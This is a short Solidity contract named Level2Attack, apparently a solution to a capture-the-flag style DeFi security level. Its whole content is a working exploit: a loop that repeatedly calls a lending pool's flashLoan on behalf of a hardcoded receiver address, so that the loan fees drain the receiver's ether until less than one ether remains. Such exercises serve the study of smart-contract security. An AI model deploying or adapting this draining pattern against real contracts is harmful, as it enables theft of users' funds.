// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Level2Attack {

    address receiver = 0x7B6b01D2A669d602C87D5b453C2eD9115daddbb7;
    address pool = 0xF282cF23B03F001DC05C35E927c99DD01C463450;
    bool keepDraining = true;

    function depleteReceiver() external {
        while (keepDraining){
            if (receiver.balance > 1000000000000000000 ){
                pool.call(abi.encodeWithSignature("flashLoan(address,uint256)", 0x7B6b01D2A669d602C87D5b453C2eD9115daddbb7, 10000000000000000000 ));
            } else { keepDraining = false;}
        }
    }
}
